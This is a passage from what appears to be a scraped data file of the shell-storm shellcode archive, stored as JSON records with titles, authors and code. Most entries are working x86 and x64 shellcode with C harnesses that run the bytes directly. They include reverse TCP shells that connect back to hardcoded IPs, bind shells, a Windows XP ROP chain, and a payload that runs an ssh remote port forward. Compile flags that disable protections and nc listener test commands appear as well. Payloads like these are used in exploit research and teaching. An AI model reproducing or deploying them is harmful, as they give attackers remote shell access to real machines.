  mov    cl,0x10", "  4000d3:   51                      push   rcx", "  4000d4:   48 89 e2                mov    rdx,rsp", "  4000d7:   41 50                   push   r8", "  4000d9:   5f                      pop    rdi", "  4000da:   6a 2b                   push   0x2b", "  4000dc:   58                      pop    rax", "  4000dd:   0f 05                   syscall ", "  4000df:   59                      pop    rcx", "  4000e0:   4d 31 c9                xor    r9,r9", "  4000e3:   49 89 c1                mov    r9,rax", "  4000e6:   4c 89 cf                mov    rdi,r9", "  4000e9:   48 31 f6                xor    rsi,rsi", "  4000ec:   6a 03                   push   0x3", "  4000ee:   5e                      pop    rsi", "00000000004000ef <doop>:", "  4000ef:   48 ff ce                dec    rsi", "  4000f2:   6a 21                   push   0x21", "  4000f4:   58                      pop    rax", "  4000f5:   0f 05                   syscall ", "  4000f7:   75 f6                   jne    4000ef <doop>", "  4000f9:   48 31 ff                xor    rdi,rdi", "  4000fc:   57                      push   rdi", "  4000fd:   57                      push   rdi", "  4000fe:   5e                      pop    rsi", "  4000ff:   5a                      pop    rdx", "  400100:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f", "  400107:   2f 73 68 ", "  40010a:   48 c1 ef 08             shr    rdi,0x8", "  40010e:   57                      push   rdi", "  40010f:   54                      push   rsp", "  400110:   5f                      pop    rdi", "  400111:   6a 3b                   push   0x3b", "  400113:   58                      pop    rax", "  400114:   0f 05                   syscall ", "", "  Code not is not optimal, this is left as an exercise to the reader ;^)", "  ", "*/", "", "#include <stdio.h>", "  ", "#define PORT \"\\x7a\\x69\" /* 31337 */", "  ", "unsigned char code[] = \\", "\"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\"", "\"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\"", "\"\\x4d\\x31\\xd2\\x41\\x52\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\\x02\"", "PORT\"\\x48\\x89\\xe6\\x41\\x50\\x5f\\x6a\\x10\\x5a\\x6a\\x31\\x58\\x0f\\x05\"", "\"\\x41\\x50\\x5f\\x6a\\x01\\x5e\\x6a\\x32\\x58\\x0f\\x05\\x48\\x89\\xe6\\x48\\x31\"", "\"\\xc9\\xb1\\x10\\x51\\x48\\x89\\xe2\\x41\\x50\\x5f\\x6a\\x2b\\x58\\x0f\\x05\\x59\"", "\"\\x4d\\x31\\xc9\\x49\\x89\\xc1\\x4c\\x89\\xcf\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\"", "\"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\"", "\"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\"", "\"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\";", " ", "int", "main(void)", "{", "    printf(\"Shellcode Length: %d\\n\", (int)sizeof(code)-1);", "    int (*ret)() = (int(*)())code;", "    ret();", "    return 0;", "}"]},
{"Title": "Linux/x64 - Reverse (192.168.1.10:31337/TCP) Shell Shellcode (118 bytes)", "Author": "Russell Willis", "Published": ": 2012-10-04", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-857.php", "View": null, "code": ["/*", "Title   : reversetcpbindshell  (118 bytes)", "Date    : 04 October 2013", "Author  : Russell Willis <codinguy@gmail.com>", "Testd on: Linux/x86_64 (SMP Debian 3.2.46-1+deb7u1 x86_64 GNU/Linux)", "", "$ objdump -D reversetcpbindshell -M intel", "reversetcpbindshell:     file format elf64-x86-64", "Disassembly of section .text:", "", "0000000000400080 <_start>:", "  400080:   48 31 c0                xor    rax,rax", "  400083:   48 31 ff                xor    rdi,rdi", "  400086:   48 31 f6                xor    rsi,rsi", "  400089:   48 31 d2                xor    rdx,rdx", "  40008c:   4d 31 c0                xor    r8,r8", "  40008f:   6a 02                   push   0x2", "  400091:   5f                      pop    rdi", "  400092:   6a 01                   push   0x1", "  400094:   5e                      pop    rsi", "  400095:   6a 06                   push   0x6", "  400097:   5a                      pop    rdx", "  400098:   6a 29                   push   0x29", "  40009a:   58                      pop    rax", "  40009b:   0f 05                   syscall ", "  40009d:   49 89 c0                mov    r8,rax", "  4000a0:   48 31 f6                xor    rsi,rsi", "  4000a3:   4d 31 d2                xor    r10,r10", "  4000a6:   41 52                   push   r10", "  4000a8:   c6 04 24 02             mov    BYTE PTR [rsp],0x2", "  4000ac:   66 c7 44 24 02 7a 69    mov    WORD PTR [rsp+0x2],0x697a", "  4000b3:   c7 44 24 04 0a 33 35    mov    DWORD PTR [rsp+0x4],0x435330a", "  4000ba:   04 ", "  4000bb:   48 89 e6                mov    rsi,rsp", "  4000be:   6a 10                   push   0x10", "  4000c0:   5a                      pop    rdx", "  4000c1:   41 50                   push   r8", "  4000c3:   5f                      pop    rdi", "  4000c4:   6a 2a                   push   0x2a", "  4000c6:   58                      pop    rax", "  4000c7:   0f 05                   syscall ", "  4000c9:   48 31 f6                xor    rsi,rsi", "  4000cc:   6a 03                   push   0x3", "  4000ce:   5e                      pop    rsi", "00000000004000cf <doop>:", "  4000cf:   48 ff ce                dec    rsi", "  4000d2:   6a 21                   push   0x21", "  4000d4:   58                      pop    rax", "  4000d5:   0f 05                   syscall ", "  4000d7:   75 f6                   jne    4000cf <doop>", "  4000d9:   48 31 ff                xor    rdi,rdi", "  4000dc:   57                      push   rdi", "  4000dd:   57                      push   rdi", "  4000de:   5e                      pop    rsi", "  4000df:   5a                      pop    rdx", "  4000e0:   48 bf 2f 2f 62 69 6e    movabs rdi,0x68732f6e69622f2f", "  4000e7:   2f 73 68 ", "  4000ea:   48 c1 ef 08             shr    rdi,0x8", "  4000ee:   57                      push   rdi", "  4000ef:   54                      push   rsp", "  4000f0:   5f                      pop    rdi", "  4000f1:   6a 3b                   push   0x3b", "  4000f3:   58                      pop    rax", "  4000f4:   0f 05                   syscall ", "", "  Code not is not optimal, this is left as an exercise to the reader ;^)", "  ", "*/", "", "#include <stdio.h>", "  ", "#define IPADDR \"\\xc0\\x80\\x10\\x0a\" /* 192.168.1.10 */", "#define PORT \"\\x7a\\x69\" /* 31337 */", "  ", "unsigned char code[] = \\", "\"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\"", "\"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\"", "\"\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\"", "\"\\x02\"PORT\"\\xc7\\x44\\x24\\x04\"IPADDR\"\\x48\\x89\\xe6\\x6a\\x10\"", "\"\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\"", "\"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\"", "\"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\"", "\"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\";", " ", "int", "main(void)", "{", "    printf(\"Shellcode Length: %d\\n\", (int)sizeof(code)-1);", "    int (*ret)() = (int(*)())code;", "    ret();", "    return 0;", "}"]},
{"Title": "Windows (XP Professional SP3) - calc.exe (C:/WINDOWS/system32/calc.exe) ROP Shellcode (428 bytes)", "Author": "b33f", "Published": ": 2012-11-05", "Platform": "Windows", "Download": "http://shell-storm.org/shellcode/files/shellcode-830.php", "View": null, "code": ["/*", "    Shellcode: Windows XP PRO SP3 - Full ROP calc shellcode", "    Author: b33f (http://www.fuzzysecurity.com/)", "    Notes: This is probably not the most efficient way but", "           I gave the dll's a run for their money ;))", "    Greets: Donato, Jahmel", "", "    OS-DLL's used:", "       Base    |    Top     |   Size     |    Version (Important!)", "    ___________|____________|____________|_____________________________", "    0x7c800000 | 0x7c8f6000 | 0x000f6000 | 5.1.2600.5781 [kernel32.dll]", "    0x7c900000 | 0x7c9b2000 | 0x000b2000 | 5.1.2600.6055 [ntdll.dll]", "    0x7e410000 | 0x7e4a1000 | 0x00091000 | 5.1.2600.5512 [USER32.dll]", "", "    UINT WINAPI WinExec(            => PTR to WinExec", "      __in  LPCSTR lpCmdLine,       => C:\\WINDOWS\\system32\\calc.exe+00000000", "      __in  UINT uCmdShow           => 0x1", "    );", "*/", "", "#include <iostream>", "#include \"windows.h\"", "", "char shellcode[]=", "\"\\xb1\\x4f\\x97\\x7c\"  // POP ECX # RETN", "\"\\xf9\\x10\\x47\\x7e\"  // Writable PTR USER32.dll", "\"\\x27\\xfa\\x87\\x7c\"  // POP EDX # POP EAX # RETN", "\"\\x43\\x3a\\x5c\\x57\"  // ASCII \"C:\\W\"", "\"\\x49\\x4e\\x44\\x4f\"  // ASCII \"INDO\"", "\"\\x04\\x18\\x80\\x7c\"  // MOV DWORD PTR DS:[ECX],EDX # MOV DWORD PTR DS:[ECX+4],EAX # POP EBP # RETN 04", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\xe5\\x02\\x88\\x7c\"  // POP EAX # RETN", "\"\\x57\\x53\\x5c\\x73\"  // ASCII \"WS\\s\"", "\"\\x38\\xd6\\x46\\x7e\"  // MOV DWORD PTR DS:[ECX+8],EAX # POP ESI # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\xe5\\x02\\x88\\x7c\"  // POP EAX # RETN", "\"\\x79\\x73\\x74\\x65\"  // ASCII \"yste\"", "\"\\xcb\\xbe\\x45\\x7e\"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\xe5\\x02\\x88\\x7c\"  // POP EAX # RETN", "\"\\x63\\x61\\x6c\\x63\"  // ASCII \"calc\"", "\"\\x31\\xa9\\x91\\x7c\"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\xe5\\x02\\x88\\x7c\"  // POP EAX # RETN", "\"\\x6d\\x33\\x32\\x5c\"  // ASCII \"m32\\\"", "\"\\xcb\\xbe\\x45\\x7e\"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\xe5\\x02\\x88\\x7c\"  // POP EAX # RETN", "\"\\x2e\\x65\\x78\\x65\"  // ASCII \".exe\"", "\"\\x31\\xa9\\x91\\x7c\"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\x9e\\x2e\\x92\\x7c\"  // XOR EAX,EAX # RETN", "\"\\x31\\xa9\\x91\\x7c\"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "\"\\xee\\x4c\\x97\\x7c\"  // DEC ECX # RETN", "//-------------------------------------------[\"C:\\WINDOWS\\system32\\calc.exe+00000000\" -> ecx]-//", "\"\\xe5\\x02\\x88\\x7c\"  // POP EAX # RETN", "\"\\x7a\\xeb\\xc3\\x6f\"  // Should result in a valid PTR in kernel32.dll", "\"\\x4f\\xda\\x85\\x7c\"  // PUSH ESP # ADC BYTE PTR DS:[EAX+CC4837C],AL # XOR EAX,EAX # INC EAX # POP EDI # POP EBP # RETN 08", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x32\\xd9\\x44\\x7e\"  // XCHG EAX,EDI # RETN", "\"\\x62\\x28\\x97\\x7c\"  // ADD EAX,20 # POP EBP # RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x62\\x28\\x97\\x7c\"  // ADD EAX,20 # POP EBP # RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x62\\x28\\x97\\x7c\"  // ADD EAX,20 # POP EBP # RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x62\\x28\\x97\\x7c\"  // ADD EAX,20 # POP EBP # RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "//-----------------------------------------------------------[Save Stack Pointer + pivot eax]-//", "\"\\xd6\\xd1\\x95\\x7c\"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x33\\x80\\x97\\x7c\"  // INC EAX # RETN", "\"\\x33\\x80\\x97\\x7c\"  // INC EAX # RETN", "\"\\x33\\x80\\x97\\x7c\"  // INC EAX # RETN", "\"\\x33\\x80\\x97\\x7c\"  // INC EAX # RETN", "\"\\xf5\\xd6\\x91\\x7c\"  // XOR ECX,ECX # RETN", "\"\\x07\\x3d\\x96\\x7c\"  // INC ECX # RETN", "\"\\xd6\\xd1\\x95\\x7c\"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\xb1\\x4f\\x97\\x7c\"  // POP ECX # RETN", "\"\\xed\\x2a\\x86\\x7c\"  // WinExec()", "\"\\xe7\\xc1\\x87\\x7c\"  // MOV DWORD PTR DS:[EAX+4],ECX # XOR EAX,EAX # POP EBP # RETN 04", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate POP", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Compensate RETN", "\"\\x8a\\x20\\x87\\x7c\"  // Final RETN for WinExec()", "\"\\x8a\\x20\\x87\\x7c\"; // Compensate WinExec()", "//------------------------------------------------------[Write Arguments and execute -> calc]-//", "", "void buff() {", "\tchar a;", "\tmemcpy((&a)+5, shellcode, sizeof(shellcode)); // Compiler dependent, works with Dev-C++ 4.9", "}", "", "int main()", "{", "    LoadLibrary(\"USER32.dll\"); // we need this dll", "\tchar buf[1024];", "\tbuff();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - Remote Port Forwarding (ssh -R 9999:localhost:22 192.168.0.226) Shellcode (87 bytes)", "Author": "Hamza Megahed", "Published": ": 2012-12-24", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-829.php", "View": null, "code": ["/*****************************************************", " * Linux/x86 Remote Port forwarding 87 bytes         *", " * ssh -R 9999:localhost:22 192.168.0.226            *", " *****************************************************", " * Author: Hamza Megahed                             *", " *****************************************************", " * Twitter: @Hamza_Mega                              *", " *****************************************************", " * blog: hamza-mega[dot]blogspot[dot]com             *", " *****************************************************", " * E-mail: hamza[dot]megahed[at]gmail[dot]com        *", " *****************************************************/", "", "xor    %eax,%eax", "push   %eax", "pushl  $0x3632322e", "pushl  $0x30302e38", "pushl  $0x36312e32", "pushw  $0x3931", "movl   %esp,%esi", "push   %eax", "push   $0x32323a74", "push   $0x736f686c", "push   $0x61636f6c", "push   $0x3a393939", "pushw  $0x3930", "movl   %esp,%ebp", "push   %eax", "pushw  $0x522d", "movl   %esp,%edi", "push   %eax", "push   $0x6873732f", "push   $0x6e69622f", "push   $0x7273752f", "movl   %esp,%ebx", "push   %eax", "push   %esi", "push   %ebp", "push   %edi", "push   %ebx", "movl   %esp,%ecx", "mov    $0xb,%al", "int    $0x80", "", "********************************", "#include <stdio.h>", "#include <string.h>", " ", "char *shellcode = ", "\"\\x31\\xc0\\x50\\x68\\x2e\\x32\\x32\\x36\\x68\\x38\\x2e\\x30\\x30\\x68\\x32\\x2e\\x31\\x36\"", "\"\\x66\\x68\\x31\\x39\\x89\\xe6\\x50\\x68\\x74\\x3a\\x32\\x32\\x68\\x6c\\x68\\x6f\\x73\\x68\"", "\"\\x6c\\x6f\\x63\\x61\\x68\\x39\\x39\\x39\\x3a\\x66\\x68\\x30\\x39\\x89\\xe5\\x50\\x66\\x68\"", "\"\\x2d\\x52\\x89\\xe7\\x50\\x68\\x2f\\x73\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x68\\x2f\\x75\"", "\"\\x73\\x72\\x89\\xe3\\x50\\x56\\x55\\x57\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "", "", " ", "int main(void)", "{", "fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "(*(void(*)()) shellcode)();", "return 0;", "}"]},
{"Title": "Linux/x86 - Reverse (127.1.1.1:11111/TCP) Shell + Null-Free Shellcode (67 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-838.php", "View": null, "code": ["/*", "", " Tiny Shell Reverse TCP Shellcode - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "*/", "", "/*", "", " tiny_shell_reverse_tcp_shellcode", "", " * 67 bytes", " * null-free if the IP and port are", "", "", " # gcc -m32 -fno-stack-protector -z execstack tiny_shell_reverse_tcp_shellcode.c -o tiny_shell_reverse_tcp_shellcode", "", " Testing", " # nc -l 127.1.1.1 11111", " # ./tiny_shell_reverse_tcp_shellcode", "", "*/", "", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x43\\x52\\x53\\x6a\"", "\"\\x02\\x89\\xe1\\xcd\\x80\\x59\\x93\\xb0\\x3f\\xcd\"", "\"\\x80\\x49\\x79\\xf9\\xb0\\x66\\x68\\x7f\\x01\\x01\"", "\"\\x01\\x66\\x68\\x2b\\x67\\x66\\x6a\\x02\\x89\\xe1\"", "\"\\x6a\\x10\\x51\\x53\\x89\\xe1\\xcd\\x80\\xb0\\x0b\"", "\"\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"", "\"\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\";", "", "main ()", "{", "", "        // When the Port contains null bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\\n\\t\"", "", "\t// Setting the IP", "\t\t \"movl $0x0101017f, (code+27)\\n\\t\"", "", "\t// Setting the port", "\t\t \"movw $0x672b, (code+33)\\n\\t\"", "", "\t// Calling the shellcode", "\t\t \"call code\");", "", "}"]},
{"Title": "Linux/x86 - Bind (1111/TCP) Shell + SO_REUSEADDR Set (Avoiding SIGSEGV) + Null-Free Shellcode (103 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-832.php", "View": null, "code": ["/*", "", " Shell Bind TCP Shellcode - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", " http://hackingbits.com", " geyslan@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "", " shell_bind_tcp_shellcode", "", " * 103 bytes", " * null-bytes free", " * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)", " * the port number is easily changeable (3th and 4th bytes of the shellcode)", "", "", " # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode", " # ./shellcode", "", " Testing", " # nc 127.0.0.1 11111", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x66\\xbd\"", "\"\\x2b\\x67\" /* <- Port number 11111 (2 bytes) */", "\"\\x6a\\x66\\x58\\x99\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\\x89\"", "\"\\xe1\\xcd\\x80\\x89\\xc6\\x5f\\xb0\\x66\\x6a\\x04\\x54\\x57\"", "\"\\x53\\x56\\x89\\xe1\\xb3\\x0e\\xcd\\x80\\xb0\\x66\\x89\\xfb\"", "\"\\x52\\x66\\x55\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\"", "\"\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\"", "\"\\x80\\xb0\\x66\\x43\\x89\\x54\\x24\\x08\\xcd\\x80\\x93\\x89\"", "\"\\xf9\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\"", "\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\"", "\"\\x53\\xeb\\xa8\";", "", "", "main ()", "{", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\tint (*ret)() = (int(*)())code;", "", "\tret();", "", "}"]},
{"Title": "Linux/x86 - Reverse (127.1.1.1:55555/TCP) Shell + Null-Free Shellcode (72 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-833.php", "View": null, "code": ["/*", "", " Shell Reverse TCP Shellcode - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "*/", "", "/*", "", " shell_reverse_tcp_shellcode", "", " * 72 bytes", " * null-bytes free if the port and address are", " * the ip address and port number are easily changeable (2nd to 5th bytes are the IP) and (9th and 10th are the Port)", " ", "", " # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode", " # ./shellcode", "", " Testing", " # nc -l 127.1.1.1 55555", " # ./shellcode ", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "", "\"\\x68\"", "\"\\x7f\\x01\\x01\\x01\"  // <- IP Number \"127.1.1.1\"", "\"\\x5e\\x66\\x68\"", "\"\\xd9\\x03\"          // <- Port Number \"55555\"", "\"\\x5f\\x6a\\x66\\x58\\x99\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\"", "\"\\x89\\xe1\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\"", "\"\\xf9\\xb0\\x66\\x56\\x66\\x57\\x66\\x6a\\x02\\x89\\xe1\\x6a\"", "\"\\x10\\x51\\x53\\x89\\xe1\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x2f\"", "\"\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"", "\"\\xeb\\xce\";", "", "main ()", "{", "", "        // When the IP contains null-bytes, printf will show a wrong shellcode length.", "", "\tprintf(\"Shellcode Length:  %d\\n\", strlen(code));", "", "\t// Pollutes all registers ensuring that the shellcode runs in any circumstance.", "", "\t__asm__ (\"movl $0xffffffff, %eax\\n\\t\"", "\t\t \"movl %eax, %ebx\\n\\t\"", "\t\t \"movl %eax, %ecx\\n\\t\"", "\t\t \"movl %eax, %edx\\n\\t\"", "\t\t \"movl %eax, %esi\\n\\t\"", "\t\t \"movl %eax, %edi\\n\\t\"", "\t\t \"movl %eax, %ebp\");", "", "\tint (*ret)() = (int(*)())code;", "", "\tret();", "", "}"]},
{"Title": "Linux/x86 - Bind (Random TCP Port) Shell + Null-Free Shellcode (65 bytes)", "Author": "Geyslan G. Bem", "Published": ": 2013-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-834.php", "View": null, "code": ["/*", "", " Shell Bind TCP Random Port Shellcode - C Language", " Linux/x86", "", " Written in 2013 by Geyslan G. Bem, Hacking bits", "", "   http://hackingbits.com", "   geyslan@gmail.com", "", " With the great support from Tiago Natel, Sec Plus", "", "   http://www.secplus.com.br/", "   tiago4orion@gmail.com", "", " This source is licensed under the Creative Commons", " Attribution-ShareAlike 3.0 Brazil License.", "", " To view a copy of this license, visit", "", "   http://creativecommons.org/licenses/by-sa/3.0/", "", " You are free:", "", "    to Share - to copy, distribute and transmit the work", "    to Remix - to adapt the work", "    to make commercial use of the work", "", " Under the following conditions:", "   Attribution - You must attribute the work in the manner", "                 specified by the author or licensor (but", "                 not in any way that suggests that they", "                 endorse you or your use of the work).", "", "   Share Alike - If you alter, transform, or build upon", "                 this work, you may distribute the", "                 resulting work only under the same or", "                 similar license to this one.", "", "*/", "", "/*", "", " shell_bind_tcp_random_port_shellcode", "", 